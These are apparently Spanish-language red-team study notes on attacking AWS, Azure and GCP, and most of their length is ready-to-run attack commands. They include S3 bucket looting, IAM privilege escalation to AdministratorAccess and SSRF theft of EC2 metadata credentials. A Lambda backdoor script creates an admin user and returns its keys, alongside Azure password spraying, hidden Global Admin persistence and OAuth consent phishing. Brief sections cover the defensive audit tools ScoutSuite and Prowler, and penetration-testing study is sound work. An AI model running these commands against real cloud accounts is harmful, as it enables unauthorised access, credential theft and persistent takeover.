## Modelos de Cloud

### **Tipos de Servicios:**

```
IaaS (Infrastructure as a Service)
• Provee: VMs, redes, storage
• Control: Alto
• Ejemplos: AWS EC2, Azure VMs
• Responsabilidad: Cliente gestiona OS, apps

PaaS (Platform as a Service)
• Provee: Plataforma de desarrollo
• Control: Medio
• Ejemplos: Heroku, Google App Engine
• Responsabilidad: Cliente gestiona apps

SaaS (Software as a Service)
• Provee: Aplicación completa
• Control: Bajo
• Ejemplos: Gmail, Office 365, Salesforce
• Responsabilidad: Proveedor gestiona todo
```

---

## Shared Responsibility Model

```
PROVEEDOR DE CLOUD:
• Seguridad DE la nube
• Infraestructura física
• Hardware
• Hypervisor
• Red física

CLIENTE:
• Seguridad EN la nube
• Datos
• Aplicaciones
• Sistema operativo (IaaS)
• Configuración de servicios
• IAM (Identity and Access Management)
• Encriptación
```

---

## OWASP Cloud Top 10 (2023)

```
1. INSECURE CLOUD CONFIGURATION
   • Buckets públicos
   • Security groups abiertos
   • Credenciales expuestas

2. INSUFFICIENT IDENTITY & ACCESS MANAGEMENT
   • Permisos excesivos
   • No MFA
   • Keys compartidas

3. INSECURE INTERFACES & APIs
   • APIs sin autenticación
   • Rate limiting inadecuado

4. SYSTEM VULNERABILITIES
   • Software sin patchear
   • CVEs conocidas

5. ACCOUNT HIJACKING
   • Credenciales comprometidas
   • Session hijacking

6. MALICIOUS INSIDERS
   • Acceso privilegiado abusado

7. APT (Advanced Persistent Threats)
   • Ataques sofisticados
   • Persistencia

8. DATA LOSS
   • Backups inadecuados
   • Borrado accidental

9. INSUFFICIENT DUE DILIGENCE
   • Migración sin análisis de seguridad

10. ABUSE OF CLOUD SERVICES
    • Cryptomining
    • Botnet hosting
```

---

# AWS Security

## Reconocimiento AWS

### **Identificar Uso de AWS**

```bash
# Identificar si usa AWS por DNS
dig example.com

# CloudFront (CDN)
# Buscar: cloudfront.net

# S3 buckets
# Formato común:
# company-backups.s3.amazonaws.com
# company-assets.s3.us-east-1.amazonaws.com

# EC2 por IPs
# Rangos de AWS publicados:
# https://ip-ranges.amazonaws.com/ip-ranges.json
```

---

## S3 Bucket Enumeration

### **Herramientas:**

```bash
# S3Scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Escanear lista de nombres
python3 s3scanner.py --threads 50 names.txt

# Lazys3 (buscar buckets)
git clone https://github.com/nahamsec/lazys3
cd lazys3
ruby lazys3.rb company

# S3Recon
aws s3 ls s3://bucket-name --no-sign-request

# Verificar permisos
aws s3 ls s3://bucket-name --no-sign-request
```

---

### **Nombres Comunes de Buckets:**

```
company-backups
company-prod
company-dev
company-staging
company-assets
company-images
company-logs
company-data
company-uploads
company-private
company.com
www.company.com
```

---

### **Explotación de S3:**

```bash
# Listar contenido (público)
aws s3 ls s3://vulnerable-bucket --no-sign-request

# Descargar archivos
aws s3 cp s3://vulnerable-bucket/file.txt . --no-sign-request

# Sincronizar todo el bucket
aws s3 sync s3://vulnerable-bucket . --no-sign-request

# Si tiene permisos de escritura (muy raro pero peligroso)
echo "hacked" > test.txt
aws s3 cp test.txt s3://vulnerable-bucket/ --no-sign-request

# Listar ACLs
aws s3api get-bucket-acl --bucket vulnerable-bucket --no-sign-request
```

---

## AWS IAM Enumeration

### **AWS CLI Configuration:**

```bash
# Instalar AWS CLI
pip3 install awscli

# Configurar credenciales (si las tienes)
aws configure
# Access Key ID: AKIAIOSFODNN7EXAMPLE
# Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Region: us-east-1

# Verificar identidad
aws sts get-caller-identity

# Listar usuarios IAM
aws iam list-users

# Listar roles
aws iam list-roles

# Listar políticas
aws iam list-policies

# Ver política específica
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/MyPolicy
```

---

## AWS Privilege Escalation

### **Técnicas Comunes:**

```bash
# 1. CreateAccessKey (crear keys para otro usuario)
aws iam create-access-key --user-name target-user

# 2. AttachUserPolicy (adjuntar política privilegiada)
aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. UpdateAssumeRolePolicy (modificar trust policy)
aws iam update-assume-role-policy --role-name target-role --policy-document file://policy.json

# 4. PassRole (pasar rol a servicio como Lambda)
aws lambda create-function --function-name evil --runtime python3.8 --role arn:aws:iam::123:role/AdminRole --handler lambda.handler --zip-file fileb://function.zip

# 5. Lambda backdoor
# Crear función Lambda con rol privilegiado
# Ejecutar comandos con ese rol
```

---

## Herramientas AWS Security

### **Pacu (AWS Exploitation Framework)**

```bash
# Instalar
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Configurar sesión
set_keys
# Ingresar Access Key y Secret Key

# Enumerar permisos
run iam__enum_permissions

# Enumerar usuarios
run iam__enum_users_roles_policies_groups

# Bruteforce asumible roles
run iam__bruteforce_assume_role

# Enumerar EC2
run ec2__enum

# Buscar secrets en metadata
run ec2__download_userdata

# Privilege escalation
run iam__privesc_scan
```

---

### **ScoutSuite (Multi-Cloud Auditing)**

```bash
# Instalar
pip3 install scoutsuite

# Auditar AWS
scout aws --profile default

# Genera reporte HTML
# Abre: scoutsuite-report/aws.html

# Muestra:
• Misconfigurations
• Security groups abiertos
• Buckets públicos
• IAM issues
• Encriptación deshabilitada
```

---

### **Prowler (AWS Security Best Practices)**

```bash
# Instalar
pip3 install prowler

# Ejecutar auditoría completa
prowler -M text

# Checks específicos
prowler -c check12  # Verificar MFA en root

# Exportar a JSON/HTML
prowler -M json -o report.json

# Checks incluyen:
• CIS AWS Foundations Benchmark
• GDPR, HIPAA compliance
• Forensics readiness
```

---

## AWS Attack Scenarios

### **Scenario 1: Metadata Service (SSRF)**

```bash
# Acceso a metadata desde EC2
curl http://169.254.169.254/latest/meta-data/

# IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Obtener role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# Devuelve:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}

# Usar credenciales
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
```

---

### **Scenario 2: Lambda Function Backdoor**

```python
# lambda_backdoor.py
import boto3
import json

def lambda_handler(event, context):
    # Ejecutar comando con rol privilegiado
    command = event['command']

    if command == 'list_buckets':
        s3 = boto3.client('s3')
        buckets = s3.list_buckets()
        return buckets

    elif command == 'create_admin':
        iam = boto3.client('iam')
        iam.create_user(UserName='backdoor-admin')
        iam.attach_user_policy(
            UserName='backdoor-admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        key = iam.create_access_key(UserName='backdoor-admin')
        return key

# Desplegar y ejecutar con rol privilegiado
```

---

# Azure Security

## Azure AD Enumeration

### **AADInternals**

```powershell
# Instalar
Install-Module AADInternals

# Enumerar tenant info
Get-AADIntTenantDetails -Domain company.com

# Verificar si email existe
Get-AADIntLoginInformation -UserName user@company.com

# Cloud brute force (cuidado con lockout)
Invoke-AADIntPasswordSpray -UserList users.txt -Password "Summer2024!"
```

---

### **AzureHound (BloodHound para Azure)**

```bash
# Instalar
pip3 install azurehound

# Recolectar datos
azurehound -u user@company.com -p Password123 -t company.onmicrosoft.com

# Importar a BloodHound
# Visualizar attack paths en Azure AD
```

---

## Azure Attack Techniques

### **Persistence en Azure:**

```powershell
# Crear backdoor user
New-AzureADUser -DisplayName "IT Support" -UserPrincipalName itsupport@company.com -Password $password

# Asignar Global Admin
Add-AzureADDirectoryRoleMember -ObjectId [GlobalAdminRoleId] -RefObjectId [UserId]

# Crear Application con permisos
New-AzureADApplication -DisplayName "Backup Service"
# Agregar permisos: Mail.Read, Files.ReadWrite.All

# OAuth phishing
# Enviar link de consentimiento malicioso
```

---

## Azure Security Tools

```bash
# ROADtools (Azure AD exploration)
pip3 install roadrecon

# Gather data
roadrecon auth -u user@company.com -p password
roadrecon gather

# GUI
roadrecon gui

# MicroBurst (Azure exploitation)
git clone https://github.com/NetSPI/MicroBurst
Import-Module MicroBurst.psm1

# Enumerar storage accounts
Invoke-EnumerateAzureStorageAccounts -Base company
```

---

# GCP Security

## GCP Enumeration

### **gcloud CLI:**

```bash
# Instalar
curl https://sdk.cloud.google.com | bash

# Autenticar
gcloud auth login

# Listar proyectos
gcloud projects list

# Listar buckets de storage
gsutil ls

# Listar VMs
gcloud compute instances list

# Listar service accounts
gcloud iam service-accounts list

# Listar roles IAM
gcloud projects get-iam-policy PROJECT_ID
```

---

### **GCP Bucket Enumeration:**

```bash
# Listar bucket público
gsutil ls gs://bucket-name

# Descargar
gsutil cp gs://bucket-name/file.txt .

# Sincronizar
gsutil -m rsync -r gs://bucket-name ./local-folder

# Verificar permisos
gsutil iam get gs://bucket-name
```